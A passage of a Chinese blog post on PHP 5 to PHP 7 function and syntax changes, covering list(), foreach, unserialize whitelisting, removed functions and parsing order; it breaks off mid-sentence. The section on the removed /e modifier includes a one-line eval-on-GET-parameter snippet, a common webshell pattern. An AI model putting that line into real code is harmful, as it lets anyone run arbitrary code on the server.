    <content type="html"><![CDATA[<h1 id="函数变更"><a href="#函数变更" class="headerlink" title="函数变更"></a>函数变更</h1><p>参考：</p><ul><li><a href="https://www.php.net/manual/zh/appendices.php">https://www.php.net/manual/zh/appendices.php</a></li><li><a href="http://xiaoze.club/">http://xiaoze.club/</a></li></ul><h2 id="关于list处理方式的变更"><a href="#关于list处理方式的变更" class="headerlink" title="关于list处理方式的变更"></a>关于list处理方式的变更</h2><p><strong>list不再以反向的顺序来进行赋值</strong></p><p><code>list</code>现在会按照变量定义的顺序来给他们进行赋值，而非反过来的顺序。 通常来说，这只会影响<code>list</code>与数组的<code>[]</code>操作符一起使用的案例，如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[], <span class="hljs-variable">$a</span>[]) = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>推荐不要依赖l<code>ist</code>的赋值顺序，因为这是一个在未来也许会变更的实现细节。</p><p><strong>list 结构现在不再能是空的</strong></p><p>list结构现在不再能是空的。如下的例子不再被允许：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>() = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(,,) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$x</span>, <span class="hljs-keyword">list</span>(), <span class="hljs-variable">$y</span>) = <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$x</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>list不再能解开string</strong></p><p><code>list</code>不再能解开字符串（string）变量。 你可以使用<code>str_split</code>来代替它</p><h2 id="foreach的变化"><a href="#foreach的变化" class="headerlink" title="foreach的变化"></a>foreach的变化</h2><p><code>foreach</code>发生了细微的变化，控制结构， 主要围绕阵列的内部数组指针和迭代处理的修改。</p><p><strong>foreach不再改变内部数组指针</strong></p><p>在PHP7之前，当数组通过<code>foreach</code>迭代时，数组指针会移动。现在开始，不再如此，见下面代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-variable">$array</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP5<br><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>)<br>    <br>PHP7<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>foreach通过值遍历时，操作的值为数组的副本</strong></p><p>当默认使用通过值遍历数组时，<code>foreach</code>实际操作的是数组的迭代副本，而非数组本身。这就意味着，<code>foreach</code> 中的操作不会修改原数组的值。</p><p><strong>foreach通过引用遍历时，有更好的迭代特性</strong></p><p>当使用引用遍历数组时，现在 <code>foreach</code>在迭代中能更好的跟踪变化。例如，在迭代中添加一个迭代值到数组中，参考下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$val</span>);<br>    <span class="hljs-variable">$array</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br></code></pre></td></tr></table></figure><h2 id="filter-var转换十六进制数字"><a href="#filter-var转换十六进制数字" class="headerlink" title="filter_var转换十六进制数字"></a>filter_var转换十六进制数字</h2><p><code>filter_var</code> 函数可以用于检查一个 <code>string</code> 是否含有十六进制数字,并将其转换为<code>integer</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="通过-define-定义常量数组"><a href="#通过-define-定义常量数组" class="headerlink" title="通过 define 定义常量数组"></a>通过 define 定义常量数组</h2><p>Array 类型的常量现在可以通过 <code>define()</code> 来定义。在 PHP5.6 中仅能通过 <code>const</code> 定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>define(<span class="hljs-string">&#x27;ANIMALS&#x27;</span>, [    <span class="hljs-string">&#x27;dog&#x27;</span>,    <span class="hljs-string">&#x27;cat&#x27;</span>,    <span class="hljs-string">&#x27;bird&#x27;</span>]);<span class="hljs-keyword">echo</span> ANIMALS[<span class="hljs-number">1</span>]; <span class="hljs-comment">// 输出 &quot;cat&quot;?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="为unserialize-提供过滤"><a href="#为unserialize-提供过滤" class="headerlink" title="为unserialize()提供过滤"></a>为unserialize()提供过滤</h2><p>这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。</p><p>可选白名单参数也可以是布尔数据，如果是FALSE就会将所有的对象都转换为<code>__PHP_Incomplete_Class</code>对象。TRUE是无限制。也可以传入类名实现白名单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> a&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;123&#x27;</span>;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">false</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">true</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_2.png"></p><h2 id="session-start可以加入一个数组"><a href="#session-start可以加入一个数组" class="headerlink" title="session_start可以加入一个数组"></a>session_start可以加入一个数组</h2><p><code>session_start()</code> 可以接受一个 <code>array</code> 作为参数， 用来覆盖 php.ini 文件中设置的 <a href="https://www.php.net/manual/zh/session.configuration.php">会话配置选项</a>。</p><p>在调用 <code>session_start()</code> 的时候， 传入的选项参数中也支持 <code>session.lazy_write</code> 行为， 默认情况下这个配置项是打开的。它的作用是控制 PHP 只有在会话中的数据发生变化的时候才 写入会话存储文件，如果会话中的数据没有发生改变，那么 PHP 会在读取完会话数据之后， 立即关闭会话存储文件，不做任何修改，可以通过设置 <code>read_and_close</code>来实现。</p><p>例如，下列代码设置 <code>session.cache_limiter</code> 为 <em>private</em>，并且在读取完毕会话数据之后马上关闭会话存储文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start([    <span class="hljs-string">&#x27;cache_limiter&#x27;</span> =&gt; <span class="hljs-string">&#x27;private&#x27;</span>,    <span class="hljs-string">&#x27;read_and_close&#x27;</span> =&gt; <span class="hljs-literal">true</span>,]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="preg-replaces不再支持-e修饰符"><a href="#preg-replaces不再支持-e修饰符" class="headerlink" title="preg_replaces不再支持&#x2F;e修饰符"></a>preg_replaces不再支持&#x2F;e修饰符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]=<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&quot;/.*/&quot;</span>,function (<span class="hljs-variable">$a</span>)&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]);&#125;,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_1.png"></p><p>但是有新的函数<code>preg_replace_callback</code></p><h2 id="dirname增加了参数"><a href="#dirname增加了参数" class="headerlink" title="dirname增加了参数"></a>dirname增加了参数</h2><p><code>dirname()</code> 增加了可选的第二个参数, <code>depth</code>, 获取当前目录向上 <code>depth</code> 级父目录的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-string">&#x27;c:/a/b/c/d&#x27;</span>,<span class="hljs-number">1</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#结果/*c:/a/b/c*/</span><br></code></pre></td></tr></table></figure><h2 id="system等函数对NULL增加了保护"><a href="#system等函数对NULL增加了保护" class="headerlink" title="system等函数对NULL增加了保护."></a>system等函数对NULL增加了保护.</h2><p><code>exec()</code>, <code>system()</code> and <code>passthru()</code> 函数对 NULL 增加了保护（我也不知道啥意思。</p><h2 id="增加整数除法函数-intdiv"><a href="#增加整数除法函数-intdiv" class="headerlink" title="增加整数除法函数 intdiv"></a>增加整数除法函数 intdiv</h2><p>新加的函数 <code>intdiv()</code> 用来进行 整数的除法运算。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-title function_ invoke__">intdiv</span>(<span class="hljs-number">10</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">// int(3)?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="增加preg-replace-callback-array"><a href="#增加preg-replace-callback-array" class="headerlink" title="增加preg_replace_callback_array"></a>增加preg_replace_callback_array</h2><p>在 PHP 7 之前，当使用 <code>preg_replace_callback()</code> 函数的时候， 由于针对每个正则表达式都要执行回调函数，可能导致过多的分支代码。 而使用新加的 <code>preg_replace_callback_array()</code> 函数， 可以使得代码更加简洁。</p><p>现在，可以使用一个关联数组来对每个正则表达式注册回调函数， 正则表达式本身作为关联数组的键， 而对应的回调函数就是关联数组的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$subject</span> = <span class="hljs-string">&#x27;Aaaaaa Bbb&#x27;</span>;<span class="hljs-title function_ invoke__">preg_replace_callback_array</span>(    [        <span class="hljs-string">&#x27;~[a]+~i&#x27;</span> =&gt; function (<span class="hljs-variable">$match</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;a&quot; found&#x27;</span>, PHP_EOL;        &#125;,        <span class="hljs-string">&#x27;~[b]+~i&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$match</span></span>) </span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;b&quot; found&#x27;</span>, PHP_EOL;        &#125;    ],    <span class="hljs-variable">$subject</span>);    <span class="hljs-comment">/*6 matches for &quot;a&quot; found3 matches for &quot;b&quot; found*/</span><br></code></pre></td></tr></table></figure><h2 id="增加Closure-call"><a href="#增加Closure-call" class="headerlink" title="增加Closure::call()"></a>增加Closure::call()</h2><p><strong>Closure::call()</strong> 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> A &#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$x</span> = <span class="hljs-number">1</span>;&#125;<span class="hljs-comment">// PHP 7 之前版本的代码$getXCB = function() &#123;return $this-&gt;x;&#125;;$getX = $getXCB-&gt;bindTo(new A, &#x27;A&#x27;); // 中间层闭包echo $getX();// PHP 7+ 及更高版本的代码$getX = function() &#123;return $this-&gt;x;&#125;;echo $getX-&gt;call(new A);#结果/*11*/</span><br></code></pre></td></tr></table></figure><h2 id="被移除的函数"><a href="#被移除的函数" class="headerlink" title="被移除的函数"></a>被移除的函数</h2><ul><li><p><code>call_user_method</code>和<code>call_user_method_array</code></p></li><li><p>所有的<code>ereg*</code>函数</p></li><li><p><code>mcrypt</code>的一部分废弃函数</p></li><li><p>所有<code>ext/mysql</code>函数</p></li><li><p>所有<code>ext/mssql</code>函数</p></li><li><p>dl in PHP-FPM</p><p>dl()在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用。</p></li></ul><h1 id="语法变更"><a href="#语法变更" class="headerlink" title="语法变更"></a>语法变更</h1><h2 id="关于变量处理的变化"><a href="#关于变量处理的变化" class="headerlink" title="关于变量处理的变化"></a>关于变量处理的变化</h2><p>PHP 7 现在使用了抽象语法树来解析源代码。这使得许多由于之前的PHP的解释器的限制所不可能实现的改进得以实现。 但出于一致性的原因导致了一些特殊例子的变动，而这些变动打破了向后兼容。 在这一章中将详细介绍这些例子。</p><h2 id="关于间接使用变量、属性和方法的变化"><a href="#关于间接使用变量、属性和方法的变化" class="headerlink" title="关于间接使用变量、属性和方法的变化"></a>关于间接使用变量、属性和方法的变化</h2><p>对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析，而不是之前的混杂着几个特殊案例的情况。 下面这张表说明了这个解析顺序的变化。</p><p>​<strong>间接调用的表达式的新旧解析顺序</strong></p><table><thead><tr><th align="left">表达式</th><th align="left">PHP 5 的解析方式</th><th align="left">PHP 7 的解析方式</th></tr></thead><tbody><tr><td align="left"><code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code></td><td align="left"><code>$&#123;$foo[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td><td align="left"><code>($$foo)[&#39;bar&#39;][&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]()</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]()</code></td></tr><tr><td align="left"><code>Foo::$bar[&#39;baz&#39;]()</code></td><td align="left"><code>Foo::&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>(Foo::$bar)[&#39;baz&#39;]()</code></td></tr></tbody></table><p>使用了旧的从右到左的解析顺序的代码必须被重写，明确的使用大括号来表明顺序（参见上表中间一列）。 这样使得代码既保持了与PHP 7.x的前向兼容性，又保持了与PHP 5.x的后向兼容性。</p><p>这同样影响了<a href="https://www.php.net/manual/zh/language.variables.scope.php#language.variables.scope.global"><strong>global</strong></a> 关键字。如果需要的话可以使用大括号来模拟之前的行为。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// Valid in PHP 5 only.</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$$foo</span>-&gt;bar;<br><br>    <span class="hljs-comment">// Valid in PHP 5 and 7.</span><br>    <span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$foo</span>-&gt;bar&#125;;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="8进制字符容错率降低"><a href="#8进制字符容错率降低" class="headerlink" title="8进制字符容错率降低"></a>8进制字符容错率降低</h2><p>在php5版本，如果一个八进制字符如果含有无效数字，该无效数字将被静默删节。但是在php7.0.0里面会触发一个解析错误。同样在php7.0.0以后被改回去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 在php5和php7.0.0之外的版本测试结果应该如下</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;                <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> )==<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;: )&quot;</span>. <span class="hljs-string">&quot;\n&quot;</span>;                   <span class="hljs-comment">// : )</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="负位移运算"><a href="#负位移运算" class="headerlink" title="负位移运算"></a>负位移运算</h2><p>以负数形式进行的位移运算将会抛出一个 <strong>ArithmeticError</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1</span> &gt;&gt; -<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">PHP5<br>int(0)<br><br>PHP7<br>Fatal <span class="hljs-keyword">error</span>: Uncaught ArithmeticError: Bit shift <span class="hljs-keyword">by</span> negative number <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php:2<br><span class="hljs-keyword">Stack</span> trace:<br>#0 &#123;main&#125;<br>  thrown <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php <span class="hljs-keyword">on</span> <span class="hljs-keyword">line</span> 2<br><br></code></pre></td></tr></table></figure><h2 id="超范围后产生位移"><a href="#超范围后产生位移" class="headerlink" title="超范围后产生位移"></a>超范围后产生位移</h2><p>超出 <code>integer</code>位宽的位移操作（无论哪个方向）将始终得到 0 作为结果。在从前，这一操作是结构依赖的</p><h2 id="十六进制字符串规范"><a href="#十六进制字符串规范" class="headerlink" title="十六进制字符串规范"></a>十六进制字符串规范</h2><p>十六进制字符串不再被认为是数字</p><p>目前截至最新的PHP7.3版本依然没有改回去的征兆，官方称不会在改了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span> == <span class="hljs-string">&quot;291&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x123&quot;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0xe&quot;</span> + <span class="hljs-string">&quot;0x1&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;0x1&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果:</p><p>左边php5.6，右边php7.2</p><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E8%AF%AD%E6%B3%95%E4%BF%AE%E6%94%B9_1.png"></p><p><a href="https://www.php.net/manual/zh/function.filter-var.php">filter_var()</a> 函数可以用于检查一个 <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> 是否含有十六进制数字,并将其转换为<a href="https://www.php.net/manual/zh/language.types.integer.php">integer</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于新的 <a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.unicode-codepoint-escape-syntax">Unicode codepoint escape syntax</a>语法， 紧连着无效序列并包含<em>\u{</em> 的字串可能引起致命错误。 为了避免这一报错，应该避免反斜杠开头。</p><h2 id="移除了-ASP-和-script-PHP-标签"><a href="#移除了-ASP-和-script-PHP-标签" class="headerlink" title="移除了 ASP 和 script PHP 标签"></a>移除了 ASP 和 script PHP 标签</h2><p>使用类似 ASP 的标签，以及 script 标签来区分 PHP 代码的方式被移除。 受到影响的标签有：</p><table><thead><tr><th align="left">开标签</th><th align="left">闭标签</th></tr></thead><tbody><tr><td align="left"><code>&lt;%</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;%=</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;script language=&quot;php&quot;&gt;</code></td><td align="left"><code>&lt;/script&gt;</code></td></tr></tbody></table><h2 id="yield-变更为右联接运算符"><a href="#yield-变更为右联接运算符" class="headerlink" title="yield 变更为右联接运算符"></a>yield 变更为右联接运算符</h2><p>在使用 <code>yield</code> 